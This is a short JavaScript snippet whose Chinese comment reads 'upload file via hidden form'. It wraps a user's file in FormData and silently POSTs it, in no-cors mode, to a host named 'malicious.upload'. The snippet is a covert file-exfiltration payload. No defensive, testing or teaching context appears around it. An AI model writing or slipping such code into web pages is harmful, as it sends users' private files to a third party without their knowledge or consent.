
// 通过隐藏表单上传文件
let form = new FormData();
form.append('file', userFile); 
fetch('https://malicious.upload', { 
  method: 'POST',
  body: form,
  mode: 'no-cors' 
});
